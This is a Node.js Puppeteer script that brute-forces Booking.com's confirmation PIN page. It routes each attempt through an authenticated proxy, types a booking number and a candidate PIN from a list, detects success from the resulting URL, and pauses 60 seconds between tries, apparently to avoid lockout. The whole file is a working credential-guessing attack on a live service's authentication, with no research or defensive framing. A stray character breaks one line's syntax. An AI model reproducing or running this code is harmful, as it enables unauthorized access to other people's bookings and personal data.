require('dotenv').config();
const puppeteer = require('puppeteer');
const fs = require('fs').promises;

const bookingId = process.env.BOOKING_ID;
const proxyUser = process.env.PROXY_USER;
const proxyPass = process.env.PROXY_PASS;
const proxyServer = process.env.PROXY_SERVER;
const pins = process.env.PINS ? process.env.PINS.split(',') : ['0966', '1111', '2222', '3333', '4444'];
const url = 'https://secure.booking.com/help/confirmation_pin_auth?';

function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function tryPin(pin, attempt = 1) {
  const browser = await puppeteer.launch({
    headless: false,
    args: [`--proxy-server=http://${proxyServer}`]
  });
  const page = await browser.newPage();
  await page.authenticate({
    username: proxyUser,
    password: proxyPass
  });
  let result = { pin, attempt, success: false, message: '', url: '', timestamp: new Date().toISOString() };

  try {
    await page.goto(url, { waitUntil: 'networkidle2' });

    await page.waitForSelector('input[name="confirmation_number"]', { timeout: 15000 });
    await page.type('input[name="confirmation_number"]', bookingId, { delay: 100 });
    await page.type('input[name="pin"]', pin, { delay: 100 });

    await wait(500);

    // Submit and wait for navigation or error
    await Promise.all([s
      page.click('button[type="submit"]'),
      page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 }).catch(() => null)
    ]);

    await wait(2000); // Extra wait for UI update

    const currentUrl = page.url();
    result.url = currentUrl;

    // Success: URL contains both unique_order_id and pincode
    const success = currentUrl.includes("unique_order_id=") && currentUrl.includes("pincode=");
    // Failure: Error message visible
    const fail = await page.$('.bui-alert--error') !== null;

    // Screenshot every attempt
    await page.screenshot({ path: `result_${pin}_${Date.now()}.png` });

    if (success) {
      result.success = true;
      result.message = 'SUCCESS: URL changed. Booking found.';
      console.log(`[${result.timestamp}] ✅ SUCCESS: PIN ${pin} is correct!`);
    } else if (fail) {
      result.message = 'FAILURE: Error message displayed.';
      console.log(`[${result.timestamp}] ❌ FAILURE: Error message displayed for PIN ${pin}`);
    } else {
      result.message = 'UNKNOWN: Neither success nor failure detected.';
      console.log(`[${result.timestamp}] 🤔 UNKNOWN: PIN ${pin}`);
    }
  } catch (err) {
    result.message = `ERROR: ${err.message}`;
    console.log(`[${result.timestamp}] ERROR: PIN ${pin} - ${err.message}`);
    try {
      await page.screenshot({ path: `error_${pin}_${Date.now()}.png` });
    } catch (e) {
      console.log('Screenshot failed:', e.message);
    }
  }

  await fs.appendFile('agent-log.txt', JSON.stringify(result) + '\n');
  await browser.close();
  return result.success;
}

async function main() {
  for (let i = 0; i < pins.length; i++) {
    console.log(`\n[${new Date().toISOString()}] Trying PIN: ${pins[i]}`);
    const success = await tryPin(pins[i]);
    if (success) {
      console.log('Correct PIN found, exiting...');
      break;
    }
    if (i < pins.length - 1) {
      console.log('Waiting 60 seconds before next attempt...');
      await wait(60000);
    }
  }
  console.log('Process finished.');
}

main();